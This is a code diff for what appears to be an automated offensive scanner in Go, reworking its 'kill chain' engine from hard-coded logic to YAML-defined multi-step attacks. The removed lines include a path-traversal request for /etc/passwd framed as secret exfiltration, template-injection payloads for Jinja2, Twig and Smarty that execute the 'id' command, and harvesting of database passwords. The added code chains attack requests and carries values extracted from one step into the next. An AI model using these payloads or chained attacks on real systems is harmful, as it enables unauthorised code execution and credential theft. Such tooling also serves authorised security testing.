@@ -6,69 +6,68 @@ import (
 	"strings"
 )
 
-// KillChain orchestrates multi-step attacks based on initial findings
+// RunKillChain orchestrates multi-step attacks based on YAML definitions
 func (e *Engine) RunKillChain(target string, findings []Result) []Result {
 	fmt.Printf("[KILL-CHAIN] Orchestrating automated multi-step attacks for: %s...\n", target)
 	var additionalFindings []Result
 
+	chains, err := LoadChains("chains")
+	if err != nil {
+		fmt.Printf("    [!] Error loading chains: %v\n", err)
+		return nil
+	}
+
 	for _, res := range findings {
-		// 1. Path Traversal -> Search for Secrets
-		if strings.Contains(res.TemplateID, "traversal") || strings.Contains(res.TemplateID, "lfi") {
-			fmt.Printf("    [CHAIN] Detected LFI. Attempting secret exfiltration...\n")
-			secrets := e.DownloadAndExfiltrate(res.Target + "/../../../../../../../../../etc/passwd")
-			if len(secrets) > 0 {
-				additionalFindings = append(additionalFindings, Result{
-					TemplateID: "chain-lfi-secrets",
-					Target:    res.Target,
-					Evidence:   "Credential leak via chained LFI attack.",
-					ExfiltratedData: secrets,
-				})
-			}
-		}
-
-		// 2. SSTI -> RCE Escalation (Titan Ares Overdrive)
-		if strings.Contains(res.TemplateID, "ssti") {
-			fmt.Printf("    [CHAIN] Detected SSTI. Attempting RCE escalation (Overdrive Mode)...\n")
-			rcePayloads := []string{
-				"{{self._TemplateReference__context.namespace.cycler.__init__.__globals__.os.popen('id').read()}}", // Jinja2
-				"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",           // Twig
-				"{{`id`}}", // Smarty
-			}
-			for _, p := range rcePayloads {
-				u := strings.Replace(res.Target, res.Evidence, p, 1) // Evidence usually contains the successful {{7*7}}
-				if u == res.Target { 
-					// fallback: append if evidence replacement fails
-					u = res.Target + p
+		for _, chain := range chains {
+			match := false
+			for _, cond := range chain.Condition {
+				if strings.Contains(strings.ToLower(res.TemplateID), strings.ToLower(cond)) {
+					match = true
+					break
 				}
-				resp, _ := e.Client.Get(u)
-				if resp != nil {
-					defer resp.Body.Close()
-					body, _ := io.ReadAll(resp.Body)
-					if strings.Contains(string(body), "uid=") {
-						fmt.Printf("    [!!!] ARES SUCCESS: SSTI escalated to RCE!\n")
-						additionalFindings = append(additionalFindings, Result{
-							TemplateID: "chain-ssti-rce",
-							Target:    u,
-							Evidence:   "Remote Code Execution confirmed via SSTI escalation.",
-							Exploited: true,
-						})
+			}
+
+			if match {
+				fmt.Printf("    [CHAIN] %s (%s)\n", chain.ID, chain.Description)
+				vars := make(map[string]string)
+				
+				for i, step := range chain.Steps {
+					e.Wait()
+					
+					// Replace variables in path and body
+					finalPath := step.Path[0] // Use first path for now
+					for k, v := range vars {
+						finalPath = strings.ReplaceAll(finalPath, "{{"+k+"}}", v)
 					}
-				}
-			}
-		}
+					
+					u := target + finalPath
+					resChain, body, resp, _ := e.scanSingleWithBody(u, step.Method, step.Headers, step.Body, step.Matchers, nil)
+					
+					if resChain != nil {
+						fmt.Printf("        [STEP %d] Success: %s\n", i+1, u)
+						
+						// Extract variables
+						for _, ext := range step.Extractors {
+							val := Extract(body, resp.Header, ext)
+							if val != "" {
+								vars[ext.Name] = val
+								fmt.Printf("        [EXTRACT] %s = %s\n", ext.Name, val)
+							}
+						}
 
-		// 3. Secret Found -> DB Probing
-		if len(res.ExfiltratedData) > 0 {
-			fmt.Printf("    [CHAIN] Found secrets. Attempting database probing...\n")
-			for k, v := range res.ExfiltratedData {
-				if strings.Contains(k, "DB_PASSWORD") {
-					// automated check for open db ports would be here
-					evidence := fmt.Sprintf("Found DB Credential: %s=%s", k, v)
-					additionalFindings = append(additionalFindings, Result{
-						TemplateID: "chain-secret-probe",
-						Target:    res.Target,
-						Evidence:   evidence,
-					})
+						// If it's the last step and we matched, record it
+						if i == len(chain.Steps)-1 {
+							additionalFindings = append(additionalFindings, Result{
+								TemplateID: chain.ID,
+								Target:     u,
+								Evidence:   fmt.Sprintf("Chained attack success via: %s", chain.ID),
+								Verified:   true,
+							})
+						}
+					} else {
+						fmt.Printf("        [STEP %d] Failed for %s\n", i+1, u)
+						break // Chain broken
+					}
 				}
 			}
 		}
